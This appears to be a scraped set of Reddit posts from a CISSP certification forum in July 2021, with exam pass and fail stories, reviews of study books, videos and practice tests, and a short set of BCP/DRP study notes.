Also I will say the OSG exam *and* BOSON had questions that were grossly in the weeds such as ""you need to network two devices over X distance and you need Y speed. What Ethernet cable would you need?"" or ""A user is currently using 802.11(whatever). They want to upgrade to X speed. What 802.11 technology would your recommend?"" 

Do NOT worry about memorizing any tables of raw numbers like these. I saw NOTHING on the exam that was that in-the-weeds. Plenty of technical or semi-technical questions, but no rote memorization of numbers. In real life this is something you can certainly look up, or you deal with so regularly that you'll learn it as a matter of course.

I'd be happy to answer any questions that I can that respect the CISSP NDA.",2021-07-22
725,ooy5bj,My CISSP journey from zero to passing with some obstacles," **My CISSP journey:**

I started studying at the beginning of 2019, inspired by some posts on reddit and the fact that the content of CISSP is very interesting for me and my further career steps. I spent about 3 months reading the Official Study Guide (OSG), researching a lot of content and taking lots of notes, and in the meantime, I was very confident that I would pass the exam.

However, in the middle of 2019, I stopped studying because I got an interesting job offer in security that required a bit more attention. So I decided to take a break and catch up on the OSG sections from time to time. 

In early 2020, I met a work colleague who has already passed the CISSP exam, he gave me some tips on good sources to continue with my studies. Later I will give a brief overview of the sources that helped me. I started studying seriously for a second time. This time with Thor and Kelly while I was driving. In the evenings I read the OSG and the latest Sunflower PDF to have a lot of information in a condensed form. Later in the year I ordered the Boson question bank and the OSG practice exam to practice some questions. In the beginning, I regularly scored 75% and reread my weak topics.

I booked my first exam in Germany, Düsseldorf for December 2020, due to Corona the test center was closed. The next possible date for the exam was in February 2021, this date was also cancelled. The next test date was then in April 2021. If I didn't pass the exam on that date or the test was cancelled again, then I would have to learn the new content because of the content update in 2021. And it happened again, the exam was cancelled again. Now it was clear I had to understand and be able to apply the new content, by 11 July. 

The last weeks before the exam I studied after work in the evenings for about 3+ hours, plus all the weekends. The day before the exam I thought I was ready to take it, but as soon as I saw the first 10 questions, I thought what the hell, I never read about this content. Halfway through, I wasn't very confident that I could pass the exam, but I focused on each question. When I finished the last question, I went to the reception and got my result - **Congratulations!** 

I passed, the CISSP exam.

**The study resources I used to prepare:**

**Cybrary Kelly Henderson:** I like her video training, she is very funny, knowledgeable and a great educator. You get a good and deep overview in her videos, which is easy to understand even as a non-native speaker. A must watch is her video on YouTube ""Why you will pass the CISSP"". 

**Thor Theache's CISSP:** I have seen a few write-ups saying that his content is not very good. But I disagree, his content is a bit expensive but worth watching. He is also a good trainer and sometimes he is available in the discord channel of certification station.

**CISSP for dummies:** I ordered this book and never read a complete chapter. Sometimes I had to re-read some content to get a second or third view of the content. 

**(ISC)2 Official Study Guide - latest version in 2020:** my main study resource, I read this book cover to cover, word for word. It is a good resource to get a good overview of the content, which is really a mile wide and a inch deep. At times I thought it was 1.61 km wide and 2.54 cm deep 😉. But if you ask me if you can pass with just the OSG, I will say, yes, it is possible, but you should take some time to read some other books as well.

**Eleventh Hour CISSP:** I got this book to get a quick overview of all the content that might be necessary in the last week. In hindsight, I would have read this first before going through the official study guide. It gives a good overview of everything to expect in the exam.

**(ISC)2 Official Practice Exam:** You should use the online version of the book, this is more helpful than the paperback. You will need to use the code you get from the paperback to register for the online test bank.

**Boson CISSP Practice Exam:** A lot of questions for a good price, updated regularly. You will need Windows to work with Boson. The questions are very technical and the answers are very well explained so you understand why the questions are wrong. This is a ready important aspect from my point of view.

**Certification Station Discord:** The CISSP channel is absolutely worthwhile. A very good resource that I would recommend anyone to join. Ultimate bunch of helpful people, open 24/7 (because of the international audience). Discussions on various topics have helped me a lot

**Destination Certification Flash Cards:** If you are on a train ride, journey or similar, take these flash cards and just read them one by one. Very helpful in my eyes. I would read them in the middle of my exam preparation.

**Do's and Don'ts:**

\- Register as soon as possible. The examination center in Germany, Düsseldorf is always fully booked at short notice.

\- I have done 4000+ questions.

\- Read correct AND incorrect answers of the question

\- Read the question twice during the exam

\- Do not give up during the exam, even if it looks bad

\- Be a member of a study group (Certification Station)

\- Eat well and do some exercises to have a fresh mind.

My last words, ""Don't talk the talk, walk the walk"" and all the best. I will now rest for a few weeks and then continue with CISA or CISM.",2021-07-21
726,oox09n,Provisionally pased CISSP 150 w/ minutes left,"I failed november 2019 I was devestated, but when I jumped into the exam I got blindsided and it felt like I got run over by a truck.

2021Going into the exam I was much more well prepared, but I knew I had weaknesses. I felt like I could pass anyways.

April-May

Took CISSP SANS Course with David Miller. Loved the course, but wasn't crazy about Miller. There were something he said, that he was so confident in, that I found that were either wrong, or poorly said. He also talked really fast without a quick break. I imagine this might be because of online teaching, but maybe go with one of the course creators. For example, we got hung up on the terminology On-premise, on-prem or on-premises and what the exam would use.

Not to drive into it, but that isn't important, lets discuss the topics, not that on-premise is not correct terminology when talking to IT personel, and at the end of the day, no one cares. However, David Miller was really good diving into the technical points and bringing it all together. If you don't mind some of the small banter, and fast speaking, then go this route.

I would recommend the course, but be weary, everyone is different, and I really believe teachers should be suited to the student.

&#x200B;

SANS then provided Audio w/ Eric Conrad. I used this whenever I could.  A lot of story telling, but when it would drive into the points it was good.

I used Eric Conrads books, which were great. Really helped me drive some points.

Coffee shot videos 9/10, they really put things together for me, on how to answer and review CISSP questions

Luke Ahmeds book 10/10 was the BIGGEST help after the full study.

**Practice Tests:**  


**Cisspprep** 100% need this, you'll get mad at yourself but do it. Thank me later  
**Sybex Wiley** Do this about 6-4 weeks prior to your test. Then a few weeks before do ALL the questions you got wrong, study those topics that you keep getting wrong  
**PocketPrep** 7/10 Its good for on the go and helps reinforce concepts that you know but KISS

731,oonpos,Passed yesterday with 100 questions,"So glade to have this done. Been in IT for a while and never got any certs. In the year, I got A+, Net+, Sec+ and now CISSP, which is way harder than any of the others. I took this exam back in May and failed the first time. So, after this I change my study method, which was just go through the Official guide a few times. 

Although I don't like bootcamps, I did attend one by Technical Institute of America, with Andrew Ramdayal. He is a very good instructor and I used his udemy to pass the sec+ a few months ago. His course really helped me understand the mindset of the question and topics. I then got the new official guide that came out last month made tons of notes. I only used CCCure questions and the the ones from the study guide. 

I think what made the difference is the way you approach the questions. Coming from sec+, you are more direct and this exam is not. Sec+ was always 1 correct choice, this exam some of them had what I taught is 4 correct choice. Andrew Ramdayal, larry greenblatt, and Kelly has the tips you need to pass the exam on youtube. Check them out. Trust me when I say this exam is more of how to select the correct answer than it is about knowing your stuff.  

You guys can can pass easily if you apply the right mindset. DO NOT go into the testing room without the right mindset or you will fail. This exam is very different than any of the 3 comptia certs I did. Thanks to everyone in this sub to help point me in the right direction after failing and losing $700.",2021-07-21

Did 25 practice problems last night and went in with an hour of sleep into the exam (Couldn't put down the video games lol). Exam ended at 120/150 question and I passed.

I felt offended at how easy it was. In my opinion, it was much easier than even Security+. And we all know how much of a joke Sec+ is.

If someone can study for the CISSP while taking 16 credits over the summer and playing Genshin Impact for 6 hours a day then I'm sorry but the exam has lost its credibility.

I will try for OSCP after the summer semester ends and hopefully it doesn't end like CISSP.

735,oo5siy,Today was the day......,"Today was the day that I skipped like a schoolgirl, air punching, and yelling around a parking lot for 10 minutes…. Yes, it happened. Okay, what you’re here for.

After a little over 2 hours (I think), I have concurred this thing… I have roughly 9 years of experience in the field, with various certifications (CASP+, SEC+, A+, and CCNA). I am also pursing an MS-Info Science – Info Assurance.

Length of preparation for me was two months and some change… I chose to utilize my summer break from Grad school to prepare for this exam… and it worked out! Not itemizing hours, or questions, or pages, or any ""quantifiable things"" as everyone is different, and everyone takes in information at different speeds.... but here's what I have for you!

My piece(s) of advice:

1. Why do you want this thing? It’s not a “fun” process…. If you do not have a solid reason to dedicate yourself for however long you identify you need to prepare… it might not happen… I’ve creeped this thread, messaged many, and it’s happened, yes…however the odds are not likely. Know why you want to be a CISSP, and let that drive you to studying and preparing to test!
2. Mentally prepare yourself to sit there for 150 questions, when my test went past 100… I immediately got down on myself based off peoples comments of the 100q pass…. This took me a minute to take a deep breath, and get back into it… so just prepare yourself mentally you’re in it for the long haul! After all, a pass is a pass…..
3. Full dedication to the process. As mentioned I chose to use my summer break for this certification. My commute to work was not filled with music, it was filled with downloaded videos (mentioned below), via YouTube premium (FREE for one month, do this!) every single day for the duration of my preparation. My evenings were not filled with having beers with buddies, or watching movies with the wife and dogs…. It was spent in our office, reading, watching, listening, writing….. This thing is its own beast, and requires your mental and physical dedication…. Know that before you start this process!
4. Relax, breath, think…. That’s what my scratch pad said…. When I hit a question that went from an easier type question, to a short story…. I had to remind myself to relax, breath…. Which allows you to think.
5. Do not be afraid to fail. This is one thing I told myself starting this process, no matter what happens, I am bettering myself for doing this… I was not afraid to fail, what I was afraid of was of having to continue to study and retake this thing….wasting what I have left of my summer break… so don’t be afraid! After all, it’s a process, and participating in this process you will be shocked at how much you learn and grow!

Resources (what people seem to care about the most):

* Sybex OSG (8th Ed.):

\-Primary resource of reference/clarification for the entire process.

\-First pass, “read” cover to cover… took end of chapter tests, moved onto next chapter.

\-Emphasizing the “read” portion, as I did not read it word for word as some did….. Chapters I felt more comfortable with the material, I skim read and picked points within each chapter I had no idea what is was, and fully read that section.

\-Second pass, read the sections I scored lower than 75% on the end of chapter tests from start to finish, retook the tests.

* Sybex OSG Practice Tests (8th Ed.): Register your book online! Much easier and more convenient as you can access the tests with your phone, or tablet…. I DID NOT take all of these tests, as mentioned I did each chapter test in the manner above. For each practice test, the matter at which I took them, took each Domain test once, pending the score (e.g. below 75-80%) I would go back and review that domain, and then retake the questions I got wrong… to alleviate from memorizing answers.
* 11th Hour CISSP: After I read the massive Sybex OSG I needed more “light reading.” I read this book front to back, easy read…. Very high level overview of the topics. So stepping your mindset back a bit from the OSG source.

Videos:

* CybraryIT -  [Free Cybersecurity Training and Career Development | Cybrary](https://www.cybrary.it/) (free access if you only access a certain number of sources, not do check whatever I did about a ""premium offer""..they'll never stop calling you until you tell them to leave you the heck alone) – Kelly H’s videos… these were a great change of pacing getting out of a book, and questions. I DID NOT watch all of these….I watched her videos on topics I needed clarified, or explained in another way from my reading.
* Destination Certification Mindmaps -  [CISSP MindMaps / Domain Review - YouTube](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) : Wow, yes, I watched all of these…. And some of them multiple times for topics I just wasn’t grabbing onto….. 10/10 recommend this to help tie words together that may help you on the exam.
* Inside Cloud and Security -  [CISSP Exam Cram - YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) : Again, yes, I watched all of these…… And some of them multiple times (probably each of them at least twice). I used his 2021 topics videos to supplement the OSG version I used not having the most recent topics.
* Prabh Nair’s CISSP videos, and Coffee Shots -  [Prabh Nair - YouTube](https://www.youtube.com/channel/UCfZMpaSGpTa4JoqoZHCJBcw) : I incorporated these my final two weeks of study (by the point you’re either getting it or you’re not)… his videos were great! I also used his 2021 topics videos to supplement the OSG version I used not having the most recent topics. Tip for his videos, put the speed on .75x… he speaks rather quickly…. This helped my tremendously.
* Andrew Ramdayal CISSP videos -  [CISSP - YouTube](https://www.youtube.com/playlist?list=PLdC3YQR4lNFLHJh_lOd2QMovHjhEdTFjN) : I watched all of his videos once, particular one that stood out to me was his “Testing Tips” and “Practice Question” videos.

Questions:

* OSG Practice tests
* CISSprep.net: I was hesitant on buying this… just because I am cheap, and the mixed opinions… I personally enjoyed this platform, the questions were a headache, yes…grammar mistakes, some complained about not knowing single or multiple answer options…whatever, if you’re worried about that… you’re head is not in the right place. Pass the exam, make your own prep engine that is grammatically correct with explicit instructions of SELECT ONE....….(end rant on CISSprep). Scores ranging from 50-80%.... my overall average score was 65.8%.. I tracked my scores throughout the process... OCD, sometimes, more of a moral booster....
* Pocketprep App: This was an awesome resource for me because of convenience. Can be taken on your phone or table! Definitely helps nail down the factual items to build the conceptual knowledge you need.
* ISC2 Official Study App: Again, great resource due to convenience! Great supplemental method of doing questions to keep your mind on topics along with Pocketprep.
* rSlades blog post on ISC2: [Practice Questions - (ISC)² Community (isc2.org)](https://community.isc2.org/t5/Exams/Practice-Questions/td-p/18626?fbclid=IwAR138lfLPSzBL90njFDCi6Xe0j-wUXT7i1I4nw8iS3rs33HyV-P_tMlzU_0). These were awesome, another source of questions with explanations (sometimes collaboration from viewers)

Notecards:

*   I made note cards for basic topics, processes, procedures, and concepts I knew I needed to have in an instance… maybe 50-75 notecards total, I did them every day before work, and every night before bed….things such as: SDLC, BCP, DRP, BIA, SOC reports, Security Models, Incident Response, RMF, RAID, Backup Types/Benefits, SAML, ISC2 Cannons, Cryptography. More or less things I knew I needed to nail down, processes/steps, and random things I just always have a hard time committing to memory. 

Anyways, yeah…. I am humbled, overwhelmed, and gracious to join the ranks of fellow CISSPs! Thanks to all for continuously keeping this thread alive (daily), I lied in wait for a while taking notes on peoples prep methods, inputs, etc. and here I am! Thanks to all those on here I reached out to with questions/advice! Now I am going to enjoy the month I have left before back to the educational grind in the evenings!

Good luck!",2021-07-20

737,onz36q,Passed (1 hour ago :D) 1st Try 100 Questions,"In the words of Colin Weaver ""Hey all you CISSP wanabees""

I just got back from my exam and all my thoughts are fresh in my mind so I thought I could share them with this group.

**My Background**

I've been in Cyber Security for just over 5 years. I work for a fortune 500. I'm a manager for a team that works on data security: DLP, DRM, Insider Threat.

**How I studied**

I started studying in late September or early October of last year. I went through the official study guide. I read through the entire book and took notes as I went. I used the online test bank that comes with the book and was going through. I was studying maybe 1 hour a day and usually 2-3h/day on weekends. Around Christmas I got burned out and then picked it back up around the end of January.

Then I went through the Destination Certification videos. I was getting about 80% on my Sybex practice exams and I felt good. Sybex also has online flashcards which helped too. At this point I was studying a minimum 2 hours per day. I went to book my exam and saw that the testing facility had filled up and I couldn't take my exam for another 2 months. (This pushed me into May and the updated course.)

With my extra time to study and to prepare for the updated course I watch Mike Chapple's Stuff on LinkedIn Learning. I'm not sure I would recommend the course, I can't remember a single topic I retained from his class. He did cover some topics for the new exam but he presented in a really dry way. I was watching at 1.25 speed the entire time. I also downloaded Anki, a flashcard program which was one of my best tools. Someone has uploaded some free practice questions that you can search for. I also just started adding terms and topics I needed to study harder. When I would go through an exam and get something wrong I would add that as a card. I have reviewed flashcards everyday since May.

With one last weekend before my exam, I bought some extra practice exams to study. I bought CISSP Exam Prep and the Udamy course. I took the Udamy exam and got a 40% three days before my exam date. Let's just say I was a bit concerned. I started taking the CISSP Exam Prep exams and I was getting 50%-60%. I freaked out and after some discussions with my fiancé decided to pay the $50 and reschedule for July.

I wanted to study seriously for the next two months with my extra time. I started by going through Kelly Handerhan's course. Her course was really good for what it covered but it doesn't cover all topics. Then I started going through the CISSP Exam Prep practice exams every other day. Then on the other day I would review other materials. I reviewed the Sybex book again. I read the 11th hour book (I wouldn't recommend it). I did IT Dojo Questions of the day, these were good when I was burned out from doing other things. I also studied my flashcard every day. At this point I was probably studying 2.5 hours everyday. I would also do Boson exams to get ready and identify gaps in my knowledge.

Yesterday, I reviewed my flashcards and then meditated a lot to calm my nerves. I watched Kelly Handerhan's why you will pass the CISSP exam. I had 3-4 questions where this video directly helped me.

**The Exam**

I expected the exam to be less technical than Boson and CISSP Exam Prep. It was. It was more straightforward knowledge based than I expected. I was expecting more experience questions but most of the questions were around a specific piece of information from the CBK. I kept hearing ‘think like a manager’, but I felt like there were more knowledge based questions. They weren't trying to trick you as much as I was expecting. I felt like I was very prepared with what I had learned and studied. Once I got into the exam it wasn't as bad as I was expecting. I felt okay about a lot of questions. In the last 10 questions, the questions got easier and I ended right at 100.

**What I recommend**

Reading the Sybex book was painful but had to be done. I think after that I would have done a visual refresher like Destination Certification. Using Boson and CISSP Exams, but using them to learn, not killing yourself on the score you get. You can't get a 40% and expect to pass but don't worry if you are getting a 66% vs a 70%. These exams are way more technical and complexly worded than the real exam. They help you prepare for the mindset of being able to pick apart a question. For example, if you see a question about control implementation, you better make sure you know if they want a preventive control, a detective control, an administrative control, or a technical control. That’s the mindset you need to have. Flashcards are a must for cementing topics in your head. I highly recommend Anki. I didn’t do a bootcamp but looking back I should have asked my company to buy me one. 

I don’t recommend the Udamy exam. It was overly confusing and just intentionally difficult. Some of the questions I was just mad at and would roll my eyes at why they said the answer I chose was wrong. 

Booking the exam well in advance is important. I didn’t realize that it would fill up. I checked once and they had openings every wednesday. Then I went to schedule my exam, and it was full for the next two months.

If I was doing it again, I think I could have shortened my study time, if I had done the practice exams earlier. I had relied a lot on the Sybex exams and thought those would be enough but they weren’t for me, they gave me a false sense of security. 

**Content Refresh**

I know a lot of people want to know how different the content is for the new exam. I do think I got a couple questions on new content but it was topics that I was familiar with through my work so it wasn’t very difficult.

**Overall**

Keep studying, keep working, keep your faith. Good luck everyone!",2021-07-20
738,onxvll,Provisionnally passed @100 questions,"Hi,

Just wanted to share my feedback after passing provisionnally.

&#x200B;

**About me**

* About 10 years experience in IT Audit, GRC, CISO. Not really a tech guy.
* I registered 2 years ago, had zero motivation to study and rescheduled it. Then covid arrived and I had to reschedule two more times...

&#x200B;

**Preparation**

1. Eleventh Hour CISSP - I did not open at all the official guide, but I have read twice this smaller book. Very good starter for lazy people like me.
2. CISSP Official Practice Tests - Did all questions and looked on internet to understand when I was wrong. Resources I used the most.
3. PocketPrep (IT & Security) - Very good to test your knowledge with direct questions to use during transports. Not too technical and not too expensive. I did all questions.
4. Random website ([http://luc.desfosses.fr/CISSP/](http://luc.desfosses.fr/CISSP/)) - I do not remember where I found it, probably on reddit, but this has been a good summary of key concepts. I also wrote on paper the key concepts (OSI, ports, security models, SOC, BCP, ...).
5. 2021 Exam change - As I took a very long time to get the motivation to start studying, the content has changed in May so I looked to the changes on this website [https://www.cybervista.net/cissp-may-2021-exam-update/](https://www.cybervista.net/cissp-may-2021-exam-update/)

I hesitated a lot to buy Boson questions after reading this reddit, but I also looked at many feedbacks here saying that Boson questions were too technical compared to the exam so I did not buy. And to be honest I think that knowing more technical details would not have helped at all. At least I saved some money.

&#x200B;

**Exam**

* As most of people here I was not very confident that I would succeed during the test. I thought I would go to 150 questions but it ended at 100...
* You really need the high level view of what is used for what (concepts). You do not need to bother learning by heart every technical details of everything.
* Work experience helped a lot, although I am not a tech guy I review lots of risk analysis and the mindset is similar.

&#x200B;

740,onsqur,Study Partner/Study Group?,"Hello everyone. I am currently studying for the CISSP exam with my test date set for September 17th. I have been in the Info Sec world for a little over 4 years as a security generalist for 2 medium-large companies (technical title is Security Engineer but it's more a combo of engineering/analyst work/compliance stuff - basically whatever needs to be done).

I have read in various posts that having a study partner or being in a study group is a helpful tool, but I'm not quite sure what that entails - regular group study sessions? IMing each other questions? Having someone to console you when you realize your brain is too small to retain any knowledge??

My current study plan is:

1. **July 8 - Jul 30:** Self-Study with Mike Chapple Linked-In Course. Review with Pocket Prep app. Take test quizzes/exams on CISSPrep after finishing course videos.
2. **Aug 2 - 6:** TIA CISSP Bootcamp
3. **Aug 9 - September 15:** Review Bootcamp notes, Create Flashcards, More CISSPrep, Read Official Study Guide Cover to Cover (the book comes with my bootcamp), Do Practice material in Official Study Guide
4. **September 16:** sacrifice goat
5. **September 17:** PROFIT?

**I don't know if this is enough.** If feel so unprepared even though i have only been watching the course and taking notes for a little over a week. For my previous 2 certs (Sec+ and GCED) I just took a bootcamp, studied a little, took a few practice tests and I was ready to go. Had no issues with either exam. But I am dreading this one. 

So I'm wondering if adding a study buddy/study group will help me feel less...stupid? Or at least help me to know if I'm way off base with my learning. 

Thanks!",2021-07-20

745,on293l,"Passed and certified, here are my thoughts.","Hey everyone, as the title states I provisionally passed my CISSP exam at the end of June and was fully certified by (ISC)² three weeks later. I delayed making a post to formulate my thoughts regarding the entire experience.  This post is kind of long, TLDR at the bottom. 

Initially I reviewed this subreddit to get a grasp of where to begin, though I will admit I didn’t follow the suggested study plan.  I studied lightly on/off for 3 months and diligently for 2 months. Make sure in the lead up you take time for yourself. If you begin feeling burnt, stop for a while.  Play some games, go for a run, or talk with a friend about non CISSP stuff. Studying through fatigue will only hurt you. 

For background I have 5 years direct information security work experience and a graduate level degree. 

Books
- CISSP All-in-One Exam Guide, Eighth Edition, 8th Edition - Rating: 8/10
- Sybex (ISC)² CISSP Certified Information Systems Security Professional Official Study Guide, 8th Edition - Rating: 10/10

The AIO helped me get into the right mindset regarding the exam. The dialogue referenced many real world applications of the concepts. 
The Sybex book was by far the best study resource for exam preparation.  It covered everything necessary for exam prep. 
When I encountered a topic or concept in either book I was unsure about (even slightly) I transcribed the definition or section verbatim into a spiral using a pencil (tactile feedback)

Practice Exams
- (ISC)² CISSP Certified Information Systems Security Professional Official Practice Tests (online bank included with the book) - Rating: 9/10
- Boson - Rating: 2/10
- Pocket prep (free 30 questions)- Rating: 3/10

The official practice tests online were invaluable for isolating the areas I had deficiencies in. Additionally, the flash cards were great for quick studying throughout the day. 
The Boson test bank was large, though in my opinion the program was clunky and the questions were not as useful as reviews I had read made them out to be. I didn’t use the Boson tests in the final stretch of my study. It may work for you, though I suggest trying the official practice tests (included in the official guide package) before shelling out money to Boson. 
PocketPrep was great for quick study when I was waiting in lines or had a spare moment. I didn’t purchase the full version as I had already purchased the Boson bank. 
Overall, the practice tests were nice to prepare me for timing on the exam and identifying deficient areas, though they are not reflective of the exam itself. As difficult as it may be, don’t put too much stock in the practice exam scores, instead use the data to focus your study efforts. I really dug my heels into practice exams in the final few days before the exam and found myself doing worse and burning myself out.  Much like the books I hand transcribed the answers to questions I got wrong and flagged them. 

Audio/Video
- CISSP, 2nd Edition Sari Greene - Rating: 7/10
- Destination Certification (YouTube) - Rating: 4/10
- Eleventh Hour CISSP Study Guide (Audible) - Rating: 10/10

Sari Green is great. The videos were encouraging and the knowledge tests assisted in recalling useful information. I will admit I didn’t finish the series as it wasn’t as in depth as the official study guide. 
The Destination Certification YouTube series was nice for background study and reference, though for me it was more of a feel good effort. Some of the graphics assisted me in mentally categorizing information. 
Eleventh Hour was fantastic. I snagged it on Audible in the final two weeks of study, listened to it at 1.25 speed while working out or cleaning and would make notes on my phone of topics I wanted to review in depth. This resource often highlighted information that I gleaned over in the books.

Endorsement Process
Once I passed, I created my account and submitted my application. There are no CISSP’s that I work with so I opted to have (ISC)² sponsor me. 2.5 weeks after submitting my application (ISC)² stated they needed additional verification of my work history. Unfortunately my place of employment refused to write/provide a letter of affirmation regarding work history and directed me to a third-party service. I provided the information to (ISC)² and received feedback that they will not interact with a third-party. (ISC)² then stated they were going to audit my application. I won’t lie to you all, this stressed my out after having read some horror stories on this subreddit. 
Nearly out of options, I provided tax documents (with sensitive information redacted) and unofficial transcripts. The next day I got a notification that my application was accepted and I could pay my membership fee.  

Overall, it was a lot of study and felt daunting at times. Take it a topic at a time, write things down, and take breaks! Good luck everyone!

TLDR: The Official (ISC)² study materials are S-tier, don’t stress over practice exam scores, take breaks and separate when you get tired.",2021-07-19

749,omj3yq,7/10/21 Fail at 150 questions,"Sigh. Here I am writing the post I never wanted to write. I went for it on 7/10/21 and didn’t pass. Hoping to help others and get a little advice on the next steps to take. 

Per my previous post [here](https://www.reddit.com/r/cissp/comments/oexlqz/cue_the_panic_5_days_until_exam_date/?utm_source=share&utm_medium=web2x&context=3), I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. I'd been studying off and on for a little over a year, four consecutive months of intense study, and utilized the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I’d also taken a 10-week boot camp class three times.

I knew there were topics I didn’t have down 100% but felt I *probably* knew enough to get me by. When I sat down at the computer to take my exam, I knew I was in trouble 20 questions in. The questions looked so foreign and vague. I read and reread and reread every question, breaking the sentence down by word, looking for some semblance of anything I’d seen before. I couldn’t make sense of any of it. I had anticipated this since that’s what everyone says but that didn’t cushion the shock.

I went all the way to 150 questions. I saw a lot of questions on SDLC, at least five questions on SOC compliance and a few on DRP/BCP. Nothing super technical with the exception of a few IPSec and tunneling protocol questions. Nothing on Kerberos, nothing on OSI. Out of all 150, I felt confident I knew the answer on maybe 5 questions. 

What’s really crazy is that I had “think like a manager; don’t DO anything” tattooed on the inside of brain going in. But none of the questions, nor any of the answers, within my exam were structured that way or provided answers that were that high-level. I’m not a technical person so it’s not my instinct to “fix” anything. There weren’t any “weeds” to get into. The questions weren’t super technical but they most definitely weren’t high-level. Somewhere in between, if that makes sense. 

I was below proficiency in four domains, near proficiency in three, and above in one domain. Interestingly, the domains I’d considered my weak domains while studying were my strongest, and my strong domains were “below proficiency.”

So now I’m trying to decide what to do: whether to give it another go or maybe try another certification like Security+ to help build up my confidence. There’s a real big part of me that wants to keep going and build onto the momentum I had and try again in 60-90 days. There’s another smaller part of me that wants to walk away from it completely and get my life back again and enjoy the rest of my summer.

Any advice, opinions, feedback? Should I try again or go for Security+? Is this just too big an elephant to eat for a non-technical professional?",2021-07-18

751,om95hn,BCP/DRP Quick Notes,"Some general BCP/DRP notes I had lying around if it helps anyone:

At a high-level, the most important thing to remember is that a BCP/DRP program has two main objectives: the first one is to preserve human life, to keep the human heart beating.  Second is one of the corners of the CIA Triad: availability.  Much like the human heart, the second high-level objective is to keep the lights blinking and systems online.

The topic of proper business continuity and disaster recovery planning is **highly testable**.

BCP process and steps (Not specifics, just the general flow)

* Components of the Business Impact Analysis (ARO, MTTR, MTBF, SLE)
* The idea that all stakeholders of a BCP should be involved in the planning
* Business continuation strategies
* The importance of documentation

**Here are some important concepts to remember**:

* The process of recovering an organization's critical business functions after a disaster is known as BCP
* Dealing with a more immediate or specific emergency is known as DRP.
* Difference between BCP and DRP
* BCP is more high-level than DRP.  DRP falls under the umbrella of BCP.
* ""What if our main data center was destroyed by an earthquake, what do we do?"" - That's BCP.
* ""What if our firewall failed at our main data center, what do we do?"" - That's DRP.
* The start of any organization's DRP/BCP program must have the approval of the senior management team
* Management's approval is also a show of their support
* BCP/DRP is all about documentation, documentation, documentation
* According to the CISSP, the first thing to look for in a disaster is the proper documentation that contains procedures and guidelines on how to deal with a disaster
* As with all things CISSP, keep the BCP/DRP document alive with regular updates.  Changes to the organization's governance, infrastructure, or an addition of a new technology should be reflected in the BCP/DRP.  Users and executives alike should also accumulate a certain level of training, education, and security awareness to contribute to a strong BCP/DRP program.

**Here are some types of disasters**:

* Man-made
* Negligence
* Warfare
* Fires
* Terrorism
* Insider threat
* Cyber attack
* Natural
* Flood
* Earthquake
* Tornado
* Tsunami

**The basic steps of a sound BCP are**:

* Phase 1: Scope and Initiation
* Phase 2: Business Impact Analysis
* Phase 3: Recovery Strategies and Continuity Development
* Phase 4: Implementation and Testing
* Phase 5: Maintenance

**RTO vs RPO vs MTTF vs MTTR**

RTO is the maximum amount of time that is needed to bring critical business functions back to normal operating status before that business is crushed.

RPO is the measure of at what point in time a business can go back and still salvage enough data to fully operate.  For example, can a business lose all the data it has accumulated in the last 10 minutes and still operate as a business? Probably.  But can it lose all the data it has accumulated in a 12 hour period and still function? This depends on the type of business.  A company that deals with the stock market and money, probably has a really short RPO, compared to a school with a database of past test scores, which could have a longer RPO.

MTTF as we stated is the same thing as MTBF.  It is the measure of how long something is supposed to operate before failure.

MTTR is the amount of time required that is necessary to bring a critical business function back to operation.  The mean time to recovery for your 2nd monitor in a dual monitor setup can probably be 72 hours to a week before you start finding it necessary to have a 2nd monitor again.  The mean time to recovery for your mouse is probably a lot shorter, maybe minutes to hours?

757,ol29bu,Provisional Pass,"Hey ladies and gents,

I took the test yesterday just out of whim. I'm a network administrator with 8 years experience. I honestly think that Security+ was harder than the CISSP exam and I think that could be attributed to the large body of knowledge and question pool that usually comes with CompTIA exams. I'm at the tail end of a Cybersecurity degree so maybe that helped out but I just went in to the test with a ""ain't nothing to it but to do it"" attitude. The body of knowledge illustrated by ISC2 is crucial to planning out how you need to study if you have prior knowledge of the field. I think my networking experience helped out too. The toughest part for us technical folks I believe would be moving away from our traditional thought process when it comes to solving problems. There are going to be multiple choices that feel like the right answer but it's all about management mentality that'll help find the ""most"" right answer. CBT nuggets helped as a sort of passive learning tool just by being able to put it on while I'm driving too and from work.

**About Me** - 9 years of experience in IT Audits, Risk and Compliance, and conducting Security Assessments. Studied for close to 6 months.

**Preparation**:
 * This subreddit - Honestly I would not have passed if it wasn't for you guys. All the resources I used below (except the OSG) I found out through all of you.   
 * OSG 8th edition - very comprehensive but I think one of the best resources.   
 * Kelly Handherhan's course on Cybrary - Her delivery and teaching style cements concepts into your brain.   
 * Destination Certification Mindmap videos and CISSP CRAM on Youtube - Very useful for reinforcements. Highly recommend watching these 1 or 2 weeks before the exam   
 * CISSPprep.net - This one was amazing. I felt the real exam questions were similar to the questions here. It was frustrating because I was scoring only 60% on an average but helped me a lot in identifying my weak areas.  
 * Eric Conrad 11th Hour CISSP - Unpopular opinion but this didn't work for me.   
 * Official practice tests 2nd edition - Make sure to read the reasons for why something was right or wasn't right.  
 * Kelly Handerhan - why you will pass the CISSP - cannot recommend this enough.   

**The Exam**: Can't say anything that hasn't been said before. Most of the questions I could boil it down to two options, some questions were direct. I honestly thought I failed. Do not bother memorizing anything. I made sure I read each question 2-3 times and put on my manager hat.

770,oi6439,Passed - 2'nd Attempt,"All, 

Would just like to give my 2 cents since I passed the exam yesterday and previously posted in this forum about failing this exam in February.  Honestly, it was heartbreaking back then and I didn't even know if I wanted to go through the process again.  I somehow found the motivation to give it one more try and I passed yesterday with literally seconds left at 120+ questions.  I thought for sure I would fail or that I'd run out of time as the questions kept coming in. 

The exam is an absolute beast and I don't think any amount of studying will fully prepare you for this thing.  Even on the second attempt, I felt complete beaten up by the test and saw things that I saw no where within the study materials.  I'd estimate I studied over 250+ hours combining from the first test. 

I honestly can't say anything that you don't already know.  You need to study the normal materials, but you also just need to have the right mindset.  Thinking like a manager is easy to say, but I'm just not sure how much that carries on this test when you're going through it.  I'd say my best advice is don't worry about knowing specific definitions, but knowing exactly how everything works in a real world setting is much more important. 

